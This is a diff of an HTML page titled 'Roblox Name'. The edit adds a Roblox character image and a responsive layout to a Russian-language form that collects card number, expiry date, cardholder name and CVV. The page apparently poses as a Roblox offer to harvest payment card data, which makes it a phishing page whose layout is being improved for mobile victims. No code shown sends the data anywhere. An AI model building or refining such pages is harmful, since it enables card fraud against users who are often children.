@@ -3,6 +3,7 @@
   <title>
    Roblox Name
   </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <script src="https://cdn.tailwindcss.com">
   </script>
   <script>
@@ -79,35 +80,38 @@
    }
   </script>
  </head>
- <body class="bg-yellow-300 flex items-center justify-center h-screen" style="background-image: url('https://i.imgur.com/h1eihrk.jpeg'); background-size: contain; background-position: center;">
-  <div class="text-center p-4 rounded mt-96">
-   <div class="space-y-2">
-    <div class="flex items-center">
-     <label class="w-1/3 text-left">
+ <body class="bg-yellow-300 flex items-center justify-center min-h-screen" style="background-image: url('https://i.imgur.com/h1eihrk.jpeg'); background-size: cover; background-position: center;">
+  <div class="text-center bg-yellow-300 bg-opacity-75 p-4 rounded mt-20 w-full max-w-md mx-auto">
+   <div class="mb-4">
+    <img src="https://i.imgur.com/ZSp4MfD.jpeg" alt="Image of a Roblox character" class="w-full">
+   </div>
+   <div class="space-y-4">
+    <div class="flex flex-col items-start">
+     <label class="w-full text-left">
       Номер карты
      </label>
-     <input id="card-number" class="w-2/3 p-2 border border-gray-400" placeholder="0000 0000 0000 0000" type="text" maxlength="19" oninput="formatCardNumber(this)" onkeypress="allowOnlyNumbers(event)"/>
+     <input id="card-number" class="w-full p-2 border border-gray-400" placeholder="0000 0000 0000 0000" type="text" maxlength="19" oninput="formatCardNumber(this)" onkeypress="allowOnlyNumbers(event)"/>
     </div>
-    <div class="flex items-center">
-     <label class="w-1/3 text-left">
+    <div class="flex flex-col items-start">
+     <label class="w-full text-left">
       Действительна до
      </label>
-     <input id="expiry-date" class="w-1/3 p-2 border border-gray-400" placeholder="MM / ГГ" type="text" maxlength="5" oninput="formatExpiryDate(this)" onkeypress="allowOnlyNumbers(event)"/>
+     <input id="expiry-date" class="w-full p-2 border border-gray-400" placeholder="MM / ГГ" type="text" maxlength="5" oninput="formatExpiryDate(this)" onkeypress="allowOnlyNumbers(event)"/>
     </div>
-    <div class="flex items-center">
-     <label class="w-1/3 text-left">
+    <div class="flex flex-col items-start">
+     <label class="w-full text-left">
       Имя держателя карты
      </label>
-     <input id="cardholder-name" class="w-2/3 p-2 border border-gray-400" placeholder="ИМЯ ФАМИЛИЯ ЛАТИНИЦЕЙ" type="text" onkeypress="allowOnlyLetters(event)"/>
+     <input id="cardholder-name" class="w-full p-2 border border-gray-400" placeholder="ИМЯ ФАМИЛИЯ ЛАТИНИЦЕЙ" type="text" onkeypress="allowOnlyLetters(event)"/>
     </div>
-    <div class="flex items-center">
-     <label class="w-1/3 text-left">
+    <div class="flex flex-col items-start">
+     <label class="w-full text-left">
       CVC2/CVV2
      </label>
-     <input id="cvc" class="w-1/3 p-2 border border-gray-400" placeholder="" type="text" maxlength="3" onkeypress="allowOnlyNumbers(event)"/>
+     <input id="cvc" class="w-full p-2 border border-gray-400" placeholder="" type="text" maxlength="3" onkeypress="allowOnlyNumbers(event)"/>
     </div>
     <div class="mt-4">
-     <button class="bg-blue-500 text-white px-4 py-2 rounded" onclick="validateFields()">
+     <button class="bg-blue-500 text-white px-4 py-2 rounded w-full" onclick="validateFields()">
       Отправить
      </button>
     </div>
